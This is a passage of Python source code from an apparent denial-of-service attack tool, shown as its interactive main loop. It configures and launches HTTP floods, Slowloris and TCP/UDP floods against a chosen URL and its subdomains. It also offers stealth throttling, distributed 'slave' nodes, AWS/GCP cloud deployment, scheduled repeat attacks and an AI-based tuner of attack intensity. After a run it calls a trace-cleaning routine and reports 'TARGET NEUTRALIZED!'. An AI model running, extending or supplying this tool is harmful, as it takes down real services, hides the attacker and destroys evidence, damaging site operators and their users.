                        if tcp_udp_mode:
                            attack_type = await prompt_session.prompt_async("[info]Select protocol (TCP/UDP): [/]", default="TCP", validator=lambda x: x in ["TCP", "UDP"])
                    elif config_choice == '10':
                        schedule_attack = (await prompt_session.prompt_async("[info]Schedule attack? (y/n): [/]", default="n")) == "y"
                        if schedule_attack:
                            interval = int(await prompt_session.prompt_async("[info]Enter interval in minutes: [/]", default="5"))
                            user_config["schedule"] = {
                                "url": validated_url,
                                "attack_name": target['name'],
                                "threads": NUM_THREADS,
                                "requests_per_thread": REQUESTS_PER_THREAD,
                                "interval": interval
                            }
                            save_user_config(user_config)
                    elif config_choice == '11':
                        cloud_deploy = (await prompt_session.prompt_async("[info]Deploy to cloud? (y/n): [/]", default="n")) == "y"
                        if cloud_deploy:
                            platform = await prompt_session.prompt_async("[info]Select platform (AWS/GCP): [/]", default="AWS", validator=lambda x: x in ["AWS", "GCP"])
                            deploy_to_cloud(platform, validated_url, target['name'], NUM_THREADS, REQUESTS_PER_THREAD)
                    elif config_choice == '12':
                        user_config = {
                            "threads": NUM_THREADS,
                            "requests_per_thread": REQUESTS_PER_THREAD,
                            "stealth_mode": stealth_mode,
                            "clean_after": clean_after,
                            "slowloris_mode": slowloris_mode,
                            "slowloris_connections": SLOWLORIS_CONNECTIONS,
                            "scan_subdomains": scan_subdomains_flag,
                            "scan_vulnerabilities": scan_vulnerabilities_flag,
                            "distributed_mode": distributed_mode
                        }
                        save_user_config(user_config)
                    else:
                        console.print("[error][ERROR] Invalid option![/]")

            # Scan subdomains if enabled
            if scan_subdomains_flag:
                domain = urllib.parse.urlparse(validated_url).hostname
                console.print("[info][SYSTEM] Scanning subdomains...[/]")
                subdomains = scan_subdomains(domain)
                if subdomains:
                    console.print(f"[info][{LANGUAGES[lang]['subdomains_found'].format(len(subdomains), ', '.join(subdomains))}]")
                else:
                    console.print("[warning][SYSTEM] No subdomains found.[/]")
                subdomains.append(validated_url)
            else:
                subdomains = [validated_url]

            # Scan vulnerabilities if enabled
            if scan_vulnerabilities_flag:
                console.print("[info][SYSTEM] Scanning vulnerabilities...[/]")
                vulnerabilities = scan_vulnerabilities(validated_url)
                if vulnerabilities:
                    console.print(f"[info][{LANGUAGES[lang]['vulnerabilities_found'].format(len(vulnerabilities), ', '.join(vulnerabilities))}]")
                else:
                    console.print("[warning][SYSTEM] No vulnerabilities found.[/]")

            total_requests = NUM_THREADS * REQUESTS_PER_THREAD
            console.print(f"[error][{LANGUAGES[lang]['attack_warning'].format(target['name'].upper(), f'{total_requests:,}')}]")
            console.print(f"[warning]{LANGUAGES[lang]['stop_instruction']}[/]")

            confirm = (await prompt_session.prompt_async(f"[error][{LANGUAGES[lang]['confirm_attack']}] (y/n): [/]", default="y")) == "y"
            if not confirm:
                console.print(f"[warning][{LANGUAGES[lang]['attack_canceled']}]")
                continue

            console.print(f"[info][{LANGUAGES[lang]['assessing_security']}]")
            loading_animation("Assessing security", 2)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if stealth_mode or security_level == "HIGH":
                NUM_THREADS = min(NUM_THREADS, recommended_threads // 2)
                REQUESTS_PER_THREAD = min(REQUESTS_PER_THREAD, recommended_requests // 2)
                attack_strategy = "STEALTH ATTACK"
            elif security_level == "LOW":
                attack_strategy = "LIGHT ATTACK"
            else:
                attack_strategy = "MODERATE FORCE"

            # Adjust threads based on device resources
            cpu_count = psutil.cpu_count()
            mem_available = psutil.virtual_memory().available / (1024 * 1024)  # MB
            if mem_available < 500 or cpu_count < 2:
                NUM_THREADS = min(NUM_THREADS, 5000)
                console.print("[warning][SYSTEM] Weak device, reducing threads to 5000.[/]")

            panel = Panel(
                f"""
[+] ATTACK STRATEGY: {target['name'].upper()}
[+] Target: {validated_url}
[+] Threads: {NUM_THREADS:,}
[+] Requests/Thread: {REQUESTS_PER_THREAD:,}
[+] Strategy: {attack_strategy}
[+] Total Requests: {total_requests:,}
[+] Stealth Mode: {'On' if stealth_mode else 'Off'}
[+] Slowloris Mode: {'On' if slowloris_mode else 'Off'}
[+] TCP/UDP Mode: {'On' if tcp_udp_mode else 'Off'}
[+] Distributed Mode: {'On' if distributed_mode else 'Off'}
[+] Subdomains: {len(subdomains)}
[+] Vulnerabilities: {len(vulnerabilities)}
                """,
                title="ATTACK INFORMATION",
                style="info"
            )
            console.print(panel)
            console.print(f"[error][{LANGUAGES[lang]['attack_starting'].format(target['name'].upper())}]")
            loading_animation("Starting attack system", 3)

            start_time = time.time()

            save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'])
            
            # Initialize CSV log
            log_file = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            with open(log_file, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "URL", "Method", "Status Code", "Response Time (ms)"])

            # Start distributed server if enabled
            if distributed_mode:
                server = start_distributed_server(9999)
                console.print(f"[info][{LANGUAGES[lang]['distributed_mode'].format(len(slaves))}]")
                await send_to_slaves(slaves, validated_url, target['name'], NUM_THREADS // (len(slaves) + 1), REQUESTS_PER_THREAD, attack_type)

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                console=console
            ) as progress:
                task = progress.add_task(f"[info]Attacking {target['name'].upper()}[/]", total=NUM_THREADS * REQUESTS_PER_THREAD)

                if slowloris_mode:
                    for url in subdomains:
                        tasks = [slowloris_attack(url, SLOWLORIS_CONNECTIONS // len(subdomains), target['name']) for _ in range(SLOWLORIS_CONNECTIONS // len(subdomains))]
                        await asyncio.gather(*tasks)
                        progress.advance(task, advance=SLOWLORIS_CONNECTIONS // len(subdomains))
                elif tcp_udp_mode:
                    for url in subdomains:
                        tasks = [tcp_udp_flood(url, REQUESTS_PER_THREAD, target['name'], attack_type) for _ in range(NUM_THREADS // len(subdomains))]
                        await asyncio.gather(*tasks)
                        progress.advance(task, advance=NUM_THREADS * REQUESTS_PER_THREAD)
                else:
                    max_connections_per_batch = min(10000, cpu_count * 1000)
                    remaining_threads = NUM_THREADS
                    batch_count = 0

                    while remaining_threads > 0:
                        batch_size = min(remaining_threads, max_connections_per_batch)
                        console.print(f"[info][SYSTEM] Starting batch {batch_count + 1} with {batch_size} connections...[/]")
                        tasks = []
                        for url in subdomains:
                            tasks.extend([perform_attack(url, REQUESTS_PER_THREAD, target['name']) for _ in range(batch_size // len(subdomains))])
                        await asyncio.gather(*tasks)
                        progress.advance(task, advance=batch_size * REQUESTS_PER_THREAD)
                        remaining_threads -= batch_size
                        batch_count += 1
                        if remaining_threads > 0:
                            console.print(f"[info][SYSTEM] Completed batch {batch_count}. {remaining_threads} connections remaining.[/]")
                            await asyncio.sleep(1)

                        # AI-based adjustment
                        ai_optimizer.train()
                        if status_codes:
                            latest_status = max(status_codes.keys(), key=lambda k: status_codes[k])
                            latest_response_time = response_times[-1] if response_times else 0
                            NUM_THREADS, REQUESTS_PER_THREAD = ai_optimizer.predict_adjustment(latest_status, latest_response_time, NUM_THREADS, REQUESTS_PER_THREAD)
                            console.print(f"[info][AI] Adjusted: Threads={NUM_THREADS}, Requests={REQUESTS_PER_THREAD}[/]")

            console.print(f"[error][{LANGUAGES[lang]['attack_completed'].format(target['name'].upper(), NUM_THREADS)}]")

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            # Generate status code summary
            status_summary = "\n".join([f"[+] Code {code}: {count} times" for code, count in status_codes.items()])

            report = Panel(
                f"""
[+] CAMPAIGN REPORT: {target['name'].upper()}
[+] Total Requests: {total_requests:,}
[+] Success: {success_count:,} ({success_count/total_requests*100:.1f}%)
[+] Failed: {error_count:,} ({error_count/total_requests*100:.1f}%)
[+] Total Time: {total_time:.2f} seconds
[+] Average Response Time: {avg_response_time:.2f}ms
[+] Peak Performance: {max_response_time:.2f}ms
[+] Minimum Latency: {min_response_time:.2f}ms
[+] Requests per Second: {total_requests/total_time:.0f}
[+] Status Code Summary:
{status_summary}
[+] Subdomains Targeted: {', '.join(subdomains)}
[+] Vulnerabilities Found: {', '.join(vulnerabilities) if vulnerabilities else 'None'}
[+] TARGET NEUTRALIZED!
                """,
                title="ATTACK REPORT",
                style="success"
            )
            console.print(report)

            # Save detailed report
            report_file = f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(report_file, "w") as f:
                json.dump({
                    "target": validated_url,
                    "strategy": target['name'],
                    "total_requests": total_requests,
                    "success_count": success_count,
                    "error_count": error_count,
                    "total_time": total_time,
                    "avg_response_time": avg_response_time,
                    "max_response_time": max_response_time,
                    "min_response_time": min_response_time,
                    "requests_per_second": total_requests / total_time,
                    "status_codes": status_codes,
                    "subdomains": subdomains,
                    "vulnerabilities": vulnerabilities
                }, f)

            # Generate HTML report
            generate_html_report(validated_url, target['name'], total_requests, success_count, error_count, total_time, avg_response_time, max_response_time, min_response_time, status_codes, subdomains, vulnerabilities)

            if clean_after:
                clean_traces()

        except KeyboardInterrupt:
            console.print(f"[warning][{LANGUAGES[lang]['attack_stopped'].format(target['name'].upper())}]")
            if clean_after:
                clean_traces()
            exit(0)
        except Exception as e:
            console.print(f"[error][{LANGUAGES[lang]['error'].format(str(e))}]")
            time.sleep(1)

# Scheduled attack
async def run_scheduled_attack(url, attack_name, threads, requests_per_thread, lang):
    console.print(f"[info][SCHEDULE] Running scheduled attack: {attack_name} on {url}[/]")
    await perform_attack(url, requests_per_thread, attack_name)

if __name__ == "__main__":
    asyncio.run(main())
